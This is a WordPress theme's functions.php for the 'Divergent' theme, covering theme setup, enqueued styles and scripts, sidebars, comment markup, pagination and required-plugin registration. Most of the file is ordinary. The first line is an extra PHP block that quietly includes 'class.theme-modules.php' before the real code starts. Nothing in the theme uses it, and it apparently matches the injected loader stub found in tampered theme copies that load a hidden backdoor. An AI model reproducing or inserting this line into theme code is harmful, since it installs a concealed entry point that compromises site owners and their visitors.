<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if ( !defined('ABSPATH')) exit;

if ( ! function_exists( 'divergent_theme_setup' ) ) {
    function divergent_theme_setup() {
        // Set the default content width.
        $GLOBALS['content_width'] = 1400;
        
        /* Add theme support */
        add_theme_support( 'automatic-feed-links' );
        add_theme_support( 'post-thumbnails' );
        add_theme_support( 'title-tag' );

        /* Translations */
        load_theme_textdomain( 'divergent', get_template_directory() .'/languages' );
        $divergentlocale = get_locale();
        $divergentlocale_file = get_template_directory() ."/languages/$divergentlocale.php";
        if ( is_readable($divergentlocale_file) ) {
            require_once($divergentlocale_file);
        }
        
        /* Register Menus */
        register_nav_menus(
            array(
                'divergent-menu' => esc_attr__( 'Sidebar Menu', 'divergent' )    
            )
        );
    }
}
add_action( 'after_setup_theme', 'divergent_theme_setup' );


/*---------------------------------------------------
Add a body class
----------------------------------------------------*/

if ( ! function_exists( 'divergent_body_classes' ) ) {
function divergent_body_classes( $classes ) {
    $classes[] = 'divergent'; 
    return $classes;    
}
}
add_filter( 'body_class','divergent_body_classes' );

/*---------------------------------------------------
Wrap category widget post count in a span
----------------------------------------------------*/
if ( ! function_exists( 'divergent_cat_count_span' ) ) {
function divergent_cat_count_span($links) {
  $links = str_replace('</a> (', '</a> <span>', $links);
  $links = str_replace(')', '</span>', $links);
  return $links;
}
}
add_filter('wp_list_categories', 'divergent_cat_count_span');

/*---------------------------------------------------
Add a pingback url auto-discovery header for single posts, pages, or attachments.
----------------------------------------------------*/

function divergent_pingback_header() {
	if ( is_singular() && pings_open() ) {
		printf( '<link rel="pingback" href="%s">', esc_url( get_bloginfo( 'pingback_url' ) ) );
	}
}
add_action( 'wp_head', 'divergent_pingback_header' );

/*---------------------------------------------------
Archive title filter
----------------------------------------------------*/

if ( ! function_exists( 'divergent_archive_title' ) ) {
    function divergent_archive_title($title) {
        if ( is_category() ) {
            $title = single_cat_title( '', false );
        } elseif ( is_tag() ) {
            $title = single_tag_title( '', false );
        }
        return $title;
    }
}

add_filter('get_the_archive_title', 'divergent_archive_title');

/*---------------------------------------------------
Create a wrapper and add provider name to the class
----------------------------------------------------*/

if ( ! function_exists( 'divergent_oembed_wrapper' ) ) {
function divergent_oembed_wrapper($return, $data, $url) {
    
    /* HTML5 Validation */
    $return = str_replace( array('frameborder="0"', 'webkitallowfullscreen', 'mozallowfullscreen'),'', $return );
    $return = preg_replace('/(<[^>]+) allow=".*?"/i', '$1', $return);
    /* HTML5 Validation END */
    
    $type = '';
    if (isset($data->type)) {
        $type = $data->type;
    }
    if ($type) {
        return "<div class='divergent-iframe-wrapper'><div class='divergent-iframe-{$type}'>{$return}</div></div>";
    } else {
        return "<div class='divergent-iframe-wrapper'>{$return}</div>";
    }
}
}
add_filter('oembed_dataparse','divergent_oembed_wrapper',10,3);
 
/*---------------------------------------------------
Admin scripts
----------------------------------------------------*/

if ( ! function_exists( 'divergent_theme_admin_scripts' ) ) {
function divergent_theme_admin_scripts(){
    wp_enqueue_style('divergent_theme_admin_style', get_template_directory_uri() . '/includes/css/admin-general.css', false, '1.1');
}
}
add_action( 'admin_enqueue_scripts', 'divergent_theme_admin_scripts' );

/*---------------------------------------------------
Stylesheets
----------------------------------------------------*/

if ( ! function_exists( 'divergent_theme_styles' ) ) {
function divergent_theme_styles() {
    $divergent_disable_external_script = get_theme_mod('divergent_disable_external_script');
    
    if (!$divergent_disable_external_script) {
        wp_enqueue_style('divergent-fonts', '//fonts.googleapis.com/css?family=Raleway:400,400i,700,700i&subset=latin-ext', false, '');
    }

    wp_enqueue_style( 'divergent-animation-style', get_template_directory_uri() . '/css/animate.css', false, '1.0');
    wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/fontawesome.min.css', false, '5.14.0');
    wp_enqueue_style( 'divergent-scrollbar-style', get_template_directory_uri() . '/css/scrollbar.css', false, '1.0');
    wp_enqueue_style( 'divergent-tooltipster-style', get_template_directory_uri() . '/css/tooltipster.css', false, '1.0');
    wp_enqueue_style( 'divergent-style', get_stylesheet_uri());
    wp_enqueue_style( 'divergent-custom', get_template_directory_uri() . '/css/custom.css', array('divergent-style'), '1.0');
    
    $divergentloadingimage = get_theme_mod('divergent_loadingimage');
    $divergentsloadingimage = get_theme_mod('divergent_sloadingimage');
    $divergentfooterhide = get_theme_mod('divergent_hidefooter');
    
    $divergent_inline_style = '';
    
    if ( is_admin_bar_showing() ) {
        $divergent_inline_style .= '#cv-page-left,#cv-page-right,#cv-menu,#cv-sidebar,.floor,.cv-left-slider {padding-top:32px !important;}@media only screen and (max-width: 780px) {#cv-page-left,#cv-page-right,#cv-menu,#cv-sidebar,.floor,.cv-left-slider {padding-top:45px !important;}}';
    }
    
    if (!empty($divergentloadingimage)) {
        $divergent_inline_style .= '#site-loading,.lg-outer .lg-item { background-image: url("' . esc_url($divergentloadingimage) . '"); }';
    } 
    
    if (!empty($divergentsloadingimage)) {
        $divergent_inline_style .= '#cv-page-left { background-image: url("' . esc_url($divergentsloadingimage) . '"); }';
    }
    
    if ($divergentfooterhide) {
        $divergent_inline_style .= '.blogpager,.divergent-pager {padding-bottom: 0px !important;}';
    }
    
    wp_add_inline_style( 'divergent-custom', $divergent_inline_style );
}
add_action('wp_enqueue_scripts', 'divergent_theme_styles');
}

/*---------------------------------------------------
Javascript files
----------------------------------------------------*/

if ( ! function_exists( 'divergent_script_register' ) ) {
function divergent_script_register() {
    
    wp_enqueue_script('html5shiv', get_template_directory_uri() . '/js/html5.js', '', '3.7.0', false );
    wp_script_add_data('html5shiv', 'conditional', 'lt IE 9' );
    
    wp_enqueue_script('dv_backstretch', get_template_directory_uri() . '/js/backstretch.min.js', array( 'jquery' ), '1.0.0', true );
    wp_enqueue_script('divergentscrollbar', get_template_directory_uri() . '/js/scrollbar.js', array( 'jquery' ), '1.0.0', true );
    wp_enqueue_script('divergenttooltips', get_template_directory_uri() . '/js/tooltips.js', array( 'jquery' ), '1.0.0', true );
    
    if ( !is_page_template('homepage.php') ) {
        wp_enqueue_script('divergentcustom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '1.0.0', true );
    }

    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( "comment-reply" );
    }
}
    add_action( 'wp_enqueue_scripts', 'divergent_script_register' ); 
}

/*---------------------------------------------------
Register Sidebar
----------------------------------------------------*/

if ( ! function_exists( 'divergent_sidebars_widgets_init' ) ) {
function divergent_sidebars_widgets_init() {
    register_sidebar( array(
        'name' => esc_attr__( 'Home Sidebar', 'divergent'),
        'id' => 'divergenthomesidebar',
        'description' => esc_attr__( 'Homepage Sidebar Widget Field', 'divergent' ),
        'before_widget' => '<div id="%1$s" class="%2$s cv-panel-widget">',
        'after_widget' => "</div>",
        'before_title' => '<div class="cv-sidebar-title"><h5>',
        'after_title' => '</h5></div>',
    ));
    register_sidebar( array(
        'name' => esc_attr__( 'Main Sidebar', 'divergent'),
        'id' => 'divergentmainsidebar',
        'description' => esc_attr__( 'Main Sidebar Widget Field', 'divergent' ),
        'before_widget' => '<div id="%1$s" class="%2$s cv-panel-widget">',
        'after_widget' => "</div>",
        'before_title' => '<div class="cv-sidebar-title"><h5>',
        'after_title' => '</h5></div>',
    ));
}
add_action( 'widgets_init', 'divergent_sidebars_widgets_init' );
}

/*---------------------------------------------------
Custom excerpt dots
----------------------------------------------------*/

if ( ! function_exists( 'divergent_excerpt_read_more' ) ) {
function divergent_excerpt_read_more( $more ) {
	return '...';
}
}
add_filter('excerpt_more', 'divergent_excerpt_read_more');

/*---------------------------------------------------
add class to next-previous post links
----------------------------------------------------*/

add_filter('next_posts_link_attributes', 'divergent_link_attributes');
add_filter('previous_posts_link_attributes', 'divergent_link_attributes');

function divergent_link_attributes() {
    return 'class="cv-button"';
}

/* ---------------------------------------------------------
Pagination
----------------------------------------------------------- */

if ( ! function_exists( 'divergent_pagination' ) ) {
function divergent_pagination() { ?>
    <?php 
    global $wp_query;
    $big = 999999999; // This needs to be an unlikely integer
    $divergent_paginate_links = paginate_links( array(
        'base' => str_replace( $big, '%#%', get_pagenum_link($big) ),
        'current' => max( 1, get_query_var('paged') ),
        'total' => $wp_query->max_num_pages,
        'prev_next' => true,
        'prev_text' => '<i class="fas fa-chevron-left"></i>',
        'next_text' => '<i class="fas fa-chevron-right"></i>',
        'type' => 'list'
    ));    
    echo wp_kses_post($divergent_paginate_links);    
?>
<?php }
}

/*---------------------------------------------------
custom tag cloud
----------------------------------------------------*/
if ( ! function_exists( 'divergent_tag_cloud_args' ) ) {
    function divergent_tag_cloud_args($args) {
        $divergent_args = array('smallest' => 15, 'largest' => 15, 'orderby' => 'count','unit' => 'px','order' => 'DESC');
        $args = wp_parse_args( $args, $divergent_args );
        return $args;
    }
}
add_filter('widget_tag_cloud_args','divergent_tag_cloud_args');

/*---------------------------------------------------
Custom comments field
----------------------------------------------------*/
if ( ! function_exists( 'divergent_comment' ) ) {
function divergent_comment($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">      
<div id="comment-<?php comment_ID(); ?>" class="comments"> 
 <?php if ($comment->comment_approved == '0') : ?>
         <em><?php echo esc_attr('Your comment is awaiting moderation.', 'divergent'); ?></em>
         <br />
      <?php endif; ?>   
     <p class="meta">
     <cite class="fn"><?php printf(esc_attr('%s'), get_comment_author_link()) ?></cite><span class="says"> -</span>   
     <a href="<?php echo htmlspecialchars( esc_attr(get_comment_link( $comment->comment_ID )) ) ?>"><?php printf(esc_attr__('%1$s at %2$s', 'divergent'), get_comment_date(),  get_comment_time()) ?></a> - <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?><?php edit_comment_link(esc_attr__('(Edit)', 'divergent'),'  ','') ?></p>
      <div class="comments_content">
          <div class="comments_content_inner">
              <?php comment_text(); ?>
          </div>
       <div class="clr"></div>       
</div>
    
<?php
}          
}

/* ---------------------------------------------------------
TGM Activation Class
----------------------------------------------------------- */

require_once dirname( __FILE__ ) . '/class-tgm-plugin-activation.php';

add_action( 'tgmpa_register', 'divergent_register_required_plugins' );

function divergent_register_required_plugins() {
	$plugins = array(
		array(
			'name'     				=> esc_html__( 'Divergent Features', 'divergent'),
			'slug'     				=> 'divergent-features',
			'source'   				=> get_template_directory_uri() . '/plugins/divergent-features.zip',
			'required' 				=> true,
			'version' 				=> '3.0',
			'force_activation' 		=> false,
			'force_deactivation' 	=> false,
			'external_url' 			=> '',
        ),
        array(
			'name'     				=> esc_html__( 'Kirki', 'divergent'),
			'slug'     				=> 'kirki',
			'required' 				=> true,
		),
        array(
			'name'     				=> esc_html__( 'CMB2', 'divergent'),
			'slug'     				=> 'cmb2',
			'required' 				=> true,
        ),
        array(
			'name'     				=> esc_html__( 'Intuitive Custom Post Order', 'divergent'),
			'slug'     				=> 'intuitive-custom-post-order',
			'required' 				=> false,
		),
        array(
			'name'     				=> esc_html__( 'Contact Form 7', 'divergent'),
			'slug'     				=> 'contact-form-7',
			'required' 				=> false,
		),
        array(
			'name'     				=> esc_html__( 'One Click Demo Import', 'divergent'),
			'slug'     				=> 'one-click-demo-import',
			'required' 				=> false,
		)
	);
    
    $config = array(
		'id'           => 'divergent',
		'default_path' => '',
		'menu'         => 'tgmpa-install-plugins',
		'has_notices'  => true,
		'dismissable'  => true,
		'dismiss_msg'  => '',
		'is_automatic' => false,
		'message'      => '', 
        );

	tgmpa( $plugins, $config );

}
?>